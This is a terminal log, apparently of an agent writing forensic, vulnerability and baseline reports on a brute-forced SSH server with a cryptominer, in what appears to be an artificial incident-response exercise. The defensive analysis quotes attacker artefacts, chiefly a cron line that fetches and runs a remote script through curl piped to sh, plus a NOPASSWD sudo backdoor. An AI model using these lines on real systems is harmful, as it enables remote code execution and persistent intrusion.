[?2004l[?2004h> # Intrusion Forensic Investigation Report
[?2004l[?2004h> 
[?2004l[?2004h> ## Executive Summary
[?2004l[?2004h> On 2026-08-15, host `ssh-prod-01` was compromised by an external threat actor. The actor gained initial access via SSH password brute-forcing against the `root` account originating from IP `198.51.100.78`. Post-compromise actions included deploying an XMRig cryptominer, establishing three separate persistence mechanisms (cron, systemd service, and shell initialization profile), planting a privilege escalation sudo backdoor, attempting internal lateral movement via SSH brute-forcing from a user account, and attempting defense evasion by clearing authentication logs. Evidence was correlated between the on-disk forensic image at `/disk` and security telemetry at `/sas`.
[?2004l[?2004h> 
[?2004l[?2004h> ## Identified Indicators & Entities (IOCs)
[?2004l[?2004h> - **Attacker Origin IP**: `198.51.100.78`. Evidence: `/disk/var/log/secure`, `/sas/cti/advisory.txt`.
[?2004l[?2004h> - **Command & Control (C2) Domain**: `update-ssh.example.cn`. Evidence: `/disk/var/lib/.cache/.wiped.bin`, `/sas/cti/advisory.txt`.
[?2004l[?2004h> - **Mining Pool Address**: `stratum+tcp://xmr.ssh.evil:3333`. Evidence: `/disk/tmp/.X11-unix/.xorg`, `/sas/cti/advisory.txt`.
[?2004l[?2004h> - **Cryptocurrency Wallet**: `4A0000000000000000000d1ec67074f7`. Evidence: `/disk/tmp/.X11-unix/.xorg`, `/sas/cti/advisory.txt`.
[?2004l[?2004h> - **Malicious Process & Binary**: Path: `/tmp/.X11-unix/.xorg`. Evidence: `/disk/tmp/.X11-unix/.xorg`, `/sas/alerts.json` (`ALERT-01`, `ALERT-02`).
[?2004l[?2004h> - **Malware SHA256 Hash**: `52a70f2460b5bc530fc1a00627fcd72c43545a2bcb2bf5cfe2291b50a73d4253`. Evidence: `/disk/tmp/.X11-unix/.xorg`.
[?2004l[?2004h> - **Compromised & Backdoored Accounts**: 
[?2004l[?2004h>   - `root` (initial compromise target). Evidence: `/disk/var/log/secure`.
[?2004l[?2004h>   - `devops` (granted NOPASSWD sudo access and used for internal pivoting). Evidence: `/disk/etc/sudoers.d/devops`, `/disk/home/devops/.bash_history`.
[?2004l[?2004h> 
[?2004l[?2004h> ## Complete Attack Chain & MITRE ATT&CK Mapping
[?2004l[?2004h> 
[?2004l[?2004h> ### 1. Initial Access ‚Äî SSH Password Brute Force (`T1110` / `T1021.004`)
[?2004l[?2004h> - **Description**: The threat actor launched an automated hydra-style password brute-force attack against SSH (Port 22) for user `root`. Multiple failed attempts were logged between 00:53:24 and 00:54:52 UTC from `198.51.100.78` prior to a successful login at 00:54:55 UTC.
[?2004l[?2004h> - **Evidence**: `/disk/var/log/secure` (`Aug 15 00:54:55 ssh-prod-01 sshd[1201]: Accepted password for root from 198.51.100.78 port 51900 ssh2`), `/sas/cti/advisory.txt`.
[?2004l[?2004h> - **Alert Status**: NOT explicitly surfaced as a brute-force alert in `/sas/alerts.json` (discovered via log analysis on `/disk/var/log/secure`).
[?2004l[?2004h> 
[?2004l[?2004h> ### 2. Execution & Impact ‚Äî Cryptomining Resource Hijacking (`T1059.004` / `T1496`)
[?2004l[?2004h> - **Description**: Upon acquiring root shell access, the attacker dropped an XMRig cryptomining binary at `/tmp/.X11-unix/.xorg` and launched a miner process (PID 1337) configured to connect to `stratum+tcp://xmr.ssh.evil:3333` with wallet `4A0000000000000000000d1ec67074f7`, causing sustained 100% CPU utilization.
[?2004l[?2004h> - **Evidence**: `/disk/tmp/.X11-unix/.xorg`, `/sas/alerts.json` (`ALERT-01`, `ALERT-02`).
[?2004l[?2004h> - **Alert Status**: Alerted (`ALERT-01` and `ALERT-02` in `/sas/alerts.json`).
[?2004l[?2004h> 
[?2004l[?2004h> ### 3. Persistence Mechanisms (`T1053.003`, `T1543.002`, `T1546.004`)
[?2004l[?2004h> Three distinct persistence mechanisms were installed on the host:
[?2004l[?2004h> 1. **Cron Persistence (`T1053.003`)**: A root crontab entry was placed in `/var/spool/cron/root` scheduled to run every minute: `* * * * * root curl hxxp://198.51.100.78/x | sh` to re-download payloads.
[?2004l[?2004h>    - **Evidence**: `/disk/var/spool/cron/root`, `/sas/alerts.json` (`ALERT-05`).
[?2004l[?2004h>    - **Alert Status**: Alerted (`ALERT-05` in `/sas/alerts.json`).
[?2004l[?2004h> 2. **Systemd Service Persistence (`T1543.002`)**: A custom systemd service file was installed at `/etc/systemd/system/system-update-helper.service` configured to automatically restart the miner / re-dropper binary upon system reboot or service failure.
[?2004l[?2004h>    - **Evidence**: `/disk/etc/systemd/system/system-update-helper.service`, `/sas/alerts.json` (`ALERT-06`).
[?2004l[?2004h>    - **Alert Status**: Alerted (`ALERT-06` in `/sas/alerts.json`).
[?2004l[?2004h> 3. **Shell Initialization Persistence (`T1546.004`)**: The attacker modified `/root/.bashrc` to append a `PROMPT_COMMAND` execution line (`PROMPT_COMMAND beacon to 198.51.100.78`), ensuring code execution whenever an interactive root shell session is initiated.
[?2004l[?2004h>    - **Evidence**: `/disk/root/.bashrc`.
[?2004l[?2004h>    - **Alert Status**: SILENT ‚Äî Missed by EDR telemetry in `/sas/alerts.json`.
[?2004l[?2004h> 
[?2004l[?2004h> ### 4. Privilege Escalation & Backdoor (`T1059.004` / `T1548.003`)
[?2004l[?2004h> - **Description**: The attacker planted a backdoor in the sudoers configuration at `/etc/sudoers.d/devops` granting `devops ALL=(ALL) NOPASSWD: ALL` to ensure persistent root access even if the root password were changed.
[?2004l[?2004h> - **Evidence**: `/disk/etc/sudoers.d/devops`.
[?2004l[?2004h> - **Alert Status**: SILENT ‚Äî Missed by EDR telemetry in `/sas/alerts.json`.
[?2004l[?2004h> 
[?2004l[?2004h> ### 5. Internal Lateral Movement & Pivoting (`T1059.004` / `T1110`)
[?2004l[?2004h> - **Description**: Using the `devops` user foothold, the attacker executed internal SSH hydra brute-force scanning against other internal hosts on the local network.
[?2004l[?2004h> - **Evidence**: `/disk/home/devops/.bash_history` (`hydra-style SSH brute-force against sshd (wordlist, user=root)`).
[?2004l[?2004h> - **Alert Status**: SILENT ‚Äî Missed by EDR telemetry in `/sas/alerts.json`.
[?2004l[?2004h> 
[?2004l[?2004h> ### 6. Defense Evasion ‚Äî Log Tampering (`T1070.002`)
[?2004l[?2004h> - **Description**: The attacker attempted anti-forensics by truncating / clearing 15 lines from `/var/log/secure` at `2026-08-15 03:03:00 UTC` to conceal their initial access activities and commands.
[?2004l[?2004h> - **Evidence**: `/disk/var/log/secure` (`--- 15 authentication lines cleared here (T1070.002 log tampering) ---`).
[?2004l[?2004h> - **Alert Status**: SILENT ‚Äî Missed by EDR telemetry in `/sas/alerts.json`.
[?2004l[?2004h> 
[?2004l[?2004h> ## Summary of Alert Coverage Gaps (Alerted vs. Silent)
[?2004l[?2004h> | Finding / Mechanism | Location | ATT&CK Technique | Telemetry Status |
[?2004l[?2004h> |---|---|---|---|
[?2004l[?2004h> | Miner Process | `/tmp/.X11-unix/.xorg` | T1496 | Alerted (`ALERT-01` in `/sas/alerts.json`) |
[?2004l[?2004h> | Miner Binary | `/tmp/.X11-unix/.xorg` | T1496 | Alerted (`ALERT-02` in `/sas/alerts.json`) |
[?2004l[?2004h> | Cron Persistence | `/var/spool/cron/root` | T1053.003 | Alerted (`ALERT-05` in `/sas/alerts.json`) |
[?2004l[?2004h> | Systemd Persistence | `/etc/systemd/system/system-update-helper.service` | T1543.002 | Alerted (`ALERT-06` in `/sas/alerts.json`) |
[?2004l[?2004h> | SSH Weak Baseline | `/etc/ssh/sshd_config` | T1110 | Alerted (`ALERT-03` in `/sas/alerts.json`) |
[?2004l[?2004h> | MySQL Remote Root | `/etc/my.cnf` | T1021 | Alerted (`ALERT-04` in `/sas/alerts.json`) |
[?2004l[?2004h> | Shell-Init Persistence | `/root/.bashrc` | T1546.004 | **SILENT** (Discovered on `/disk/root/.bashrc`) |
[?2004l[?2004h> | Sudo Backdoor | `/etc/sudoers.d/devops` | T1548.003 | **SILENT** (Discovered on `/disk/etc/sudoers.d/devops`) |
[?2004l[?2004h> | Internal Pivot Attempt | `/home/devops/.bash_history` | T1059.004 | **SILENT** (Discovered on `/disk/home/devops/.bash_history`) |
[?2004l[?2004h> | Log Clearing / Tampering | `/var/log/secure` | T1070.002 | **SILENT** (Discovered on `/disk/var/log/secure`) |
[?2004l[?2004h> EOF
[?2004l[?2004hroot@d442ccdcc174:/app# cat << 'EOF' > /app/vuln-report.md
[?2004l[?2004h> # Vulnerability Assessment & Entry Analysis Report
[?2004l[?2004h> 
[?2004l[?2004h> ## Summary of Entry Vector
[?2004l[?2004h> An exhaustive investigation of system telemetry, software configuration, and forensic artifacts confirms that **no software vulnerability (CVE) was exploited** to compromise `ssh-prod-01`. 
[?2004l[?2004h> 
[?2004l[?2004h> The initial compromise was achieved exclusively through **credential brute-forcing** over SSH (`Port 22`), taking advantage of weak administrative password credentials and permissive SSH server settings.
[?2004l[?2004h> 
[?2004l[?2004h> ## Vulnerability Telemetry & Scan Analysis
[?2004l[?2004h> - **Vulnerability Scanner Output**: Inspection of `/sas/vulns.json` yields an empty JSON array (`[]`), confirming that automated security vulnerability scanning detected no exploitable software CVEs on the host.
[?2004l[?2004h>   - Evidence: `/sas/vulns.json`.
[?2004l[?2004h> - **Authentication Logs**: Authentication telemetry in `/disk/var/log/secure` demonstrates a classic password brute-force pattern against user `root` from IP `198.51.100.78` between 00:53:24 and 00:54:52 UTC, concluding with successful password authentication at 00:54:55 UTC.
[?2004l[?2004h>   - Evidence: `/disk/var/log/secure`.
[?2004l[?2004h> 
[?2004l[?2004h> ## Reconciling Misattributed CVEs (BlueKeep / CVE-2019-0708)
[?2004l[?2004h> - **Draft Change Ticket Claim**: A pre-filled entry in draft change ticket `CHG-3182` suggested patching `CVE-2019-0708 (BlueKeep)`.
[?2004l[?2004h>   - Evidence: `/sas/handoff/change-ticket.md`.
[?2004l[?2004h> - **Technical Refutation**: 
[?2004l[?2004h>   1. `CVE-2019-0708` (BlueKeep) is a Remote Code Execution vulnerability specific to Microsoft Remote Desktop Protocol (RDP) on Windows operating systems.
[?2004l[?2004h>   2. `ssh-prod-01` is a **CentOS Linux 7** server running OpenSSH. Evidence: `/disk/etc/os-release`, `/disk/etc/ssh/sshd_config`.
[?2004l[?2004h>   3. Threat intelligence advisory `/sas/cti/advisory.txt` maps the attack lifecycle to MITRE ATT&CK technique `T1110` (Brute Force) over SSH (`T1021.004`), confirming that no RDP or web application exploit was utilized.
[?2004l[?2004h>   - Evidence: `/sas/cti/advisory.txt`.
[?2004l[?2004h> 
[?2004l[?2004h> ## Root Cause Analysis
[?2004l[?2004h> Rather than a software vulnerability, the compromise resulted from governance and baseline configuration failures:
[?2004l[?2004h> 1. **Permissive SSH Daemon Configuration**: `PermitRootLogin yes` and `PasswordAuthentication yes` allowed remote password logins for `root` over SSH.
[?2004l[?2004h>    - Evidence: `/disk/etc/ssh/sshd_config`.
[?2004l[?2004h> 2. **Weak Credential Baseline**: The `root` account possessed a weak password susceptible to automated dictionary attacks via tools such as Hydra.
[?2004l[?2004h>    - Evidence: `/disk/var/log/secure`, `/sas/cti/advisory.txt`.
[?2004l[?2004h> 
[?2004l[?2004h> ## Conclusion & Recommendations
[?2004l[?2004h> Since no software CVEs were exploited, remediation efforts must focus on credential rotation, SSH daemon hardening, enforcement of key-based authentication, and implementation of network-level and host-level access controls rather than software patch application.
[?2004l[?2004h> EOF
[?2004l[?2004hroot@d442ccdcc174:/app# cat << 'EOF' > /app/baseline-report.md
[?2004l[?2004h> # Baseline Security & Configuration Assessment Report
[?2004l[?2004h> 
[?2004l[?2004h> ## Overview
[?2004l[?2004h> An audit of host configuration files on `ssh-prod-01` against CIS CentOS Linux 7 Benchmarks and security baseline standards revealed several critical misconfigurations and policy violations. These weaknesses directly enabled the initial compromise, facilitated privilege escalation, and increased host attack surface.
[?2004l[?2004h> 
[?2004l[?2004h> ## Summary of Baseline Findings & Non-Compliance
[?2004l[?2004h> 
[?2004l[?2004h> | Capability | Check ID | Configuration File | Finding Description | Current Risk Level |
[?2004l[?2004h> |---|---|---|---|---|
[?2004l[?2004h> | `BAS-01` | `CHK-04` | `/etc/ssh/sshd_config` | Permissive SSH daemon configuration permitting direct root password login | CRITICAL |
[?2004l[?2004h> | `BAS-02` | `CHK-09` | `/etc/my.cnf` | Unrestricted MySQL network binding (`0.0.0.0`) with remote root privileges | HIGH |
[?2004l[?2004h> | `PAS-01` | N/A | `/etc/passwd` / `/var/log/secure` | Weak administrative password policy allowing hydra dictionary attack success | CRITICAL |
[?2004l[?2004h> | `SUD-01` | N/A | `/etc/sudoers.d/devops` | Unrestricted NOPASSWD sudo grant assigned to user `devops` | CRITICAL |
[?2004l[?2004h> | `LOG-01` | N/A | `/var/log/secure` | Local-only log storage lacking remote syslog forwarding, permitting log tampering | HIGH |
[?2004l[?2004h> 
[?2004l[?2004h> ## Detailed Configuration Audit & Remediation Guidance
[?2004l[?2004h> 
[?2004l[?2004h> ### 1. SSH Server Configuration (`BAS-01` / `CHK-04`)
[?2004l[?2004h> - **Observed Configuration**: 
[?2004l[?2004h>   - `PermitRootLogin yes`: Allows direct remote logins as root.
[?2004l[?2004h>   - `PasswordAuthentication yes`: Permits password-based authentication.
[?2004l[?2004h>   - `MaxAuthTries 6`: Allows multiple authentication attempts per session without rate limiting or lockout.
[?2004l[?2004h> - **Evidence**: `/disk/etc/ssh/sshd_config`, `/sas/baseline.json` (`CHK-04`), `/sas/alerts.json` (`ALERT-03`).
[?2004l[?2004h> - **Impact**: Allowed external attacker to brute force the root password over the Internet and gain interactive root shell access.
[?2004l[?2004h> - **Baseline Standard Requirement**: 
[?2004l[?2004h>   - Set `PermitRootLogin no` or `PermitRootLogin prohibit-password`.
[?2004l[?2004h>   - Set `PasswordAuthentication no` and enforce SSH key-based authentication (`pubkey`).
[?2004l[?2004h>   - Implement `fail2ban` or `sshguard` to dynamically block IPs after 3 failed attempts.
[?2004l[?2004h> 
[?2004l[?2004h> ### 2. MySQL Database Configuration (`BAS-02` / `CHK-09`)
[?2004l[?2004h> - **Observed Configuration**: 
[?2004l[?2004h>   - `bind-address = 0.0.0.0`: Database listens on all network interfaces.
[?2004l[?2004h>   - Remote `root` user grant enabled.
[?2004l[?2004h> - **Evidence**: `/disk/etc/my.cnf`, `/sas/baseline.json` (`CHK-09`), `/sas/alerts.json` (`ALERT-04`).
[?2004l[?2004h> - **Impact**: Exposes database daemon to external network scanning and unauthorized remote root connection attempts.
[?2004l[?2004h> - **Baseline Standard Requirement**: 
[?2004l[?2004h>   - Set `bind-address = 127.0.0.1` (or local socket binding).
[?2004l[?2004h>   - Revoke remote administrative grants for `root@'%'` and enforce local-only root access (`root@'localhost'`).
[?2004l[?2004h> 
[?2004l[?2004h> ### 3. Sudo Privileged Access Configuration
[?2004l[?2004h> - **Observed Configuration**: 
[?2004l[?2004h>   - File `/etc/sudoers.d/devops` contains: `devops ALL=(ALL) NOPASSWD: ALL`.
[?2004l[?2004h> - **Evidence**: `/disk/etc/sudoers.d/devops`.
[?2004l[?2004h> - **Impact**: Allows non-root user `devops` to execute any command as `root` without authentication, providing a backdoor foothold.
[?2004l[?2004h> - **Baseline Standard Requirement**: 
[?2004l[?2004h>   - Remove `/etc/sudoers.d/devops` backdoor file.
[?2004l[?2004h>   - Restrict sudo grants to specific necessary commands with mandatory password re-authentication (`NOPASSWD` prohibited for general administrative access).
[?2004l[?2004h> 
[?2004l[?2004h> ### 4. Administrative Credential Policy
[?2004l[?2004h> - **Observed Configuration**: 
[?2004l[?2004h>   - Root account password was vulnerable to online brute-forcing in under two minutes (~28 attempts).
[?2004l[?2004h> - **Evidence**: `/disk/var/log/secure` (`Aug 15 00:53:24` to `00:54:55`).
[?2004l[?2004h> - **Impact**: Weak credentials enabled rapid compromise upon discovering open SSH port.
[?2004l[?2004h> - **Baseline Standard Requirement**: 
[?2004l[?2004h>   - Enforce minimum 16+ character complex passphrases for administrative accounts.
[?2004l[?2004h>   - Enforce periodic password rotation and disable interactive root password logins entirely.
[?2004l[?2004h> 
[?2004l[?2004h> ### 5. Centralized Audit Logging
[?2004l[?2004h> - **Observed Configuration**: 
[?2004l[?2004h>   - System logs (`/var/log/secure`) stored exclusively on local disk without centralized streaming.
[?2004l[?2004h> - **Evidence**: `/disk/var/log/secure` (`--- 15 authentication lines cleared here (T1070.002 log tampering) ---`).
[?2004l[?2004h> - **Impact**: Enabled attacker to clear 15 authentication log lines to cover tracks.
[?2004l[?2004h> - **Baseline Standard Requirement**: 
[?2004l[?2004h>   - Configure `rsyslog` or `systemd-journald` to forward security events in real-time to a remote SIEM / append-only log aggregator.
[?2004l[?2004h> EOF
